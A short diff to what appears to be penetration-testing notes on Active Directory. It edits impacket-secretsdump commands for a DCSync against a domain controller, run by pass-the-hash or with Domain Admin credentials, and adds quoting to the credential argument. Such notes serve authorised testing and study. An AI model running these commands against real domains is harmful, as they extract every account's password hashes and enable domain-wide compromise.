@@ -4,4 +4,4 @@
 
 #### 2) impacket-secretsdump DC.DOMAIN.COM -hashes 'LM_HASH:NTLM_HASH' (Do DC sync via PtH)
 
-#### 3) impacket-secretsdump DOMAIN.COM\administrator:PASSWORD@DC_IP (Do DC Sync with Domain Admin credentials)
+#### 3) impacket-secretsdump 'DOMAIN.COM\administrator:PASSWORD'@DC_IP (Do DC Sync with Domain Admin credentials)
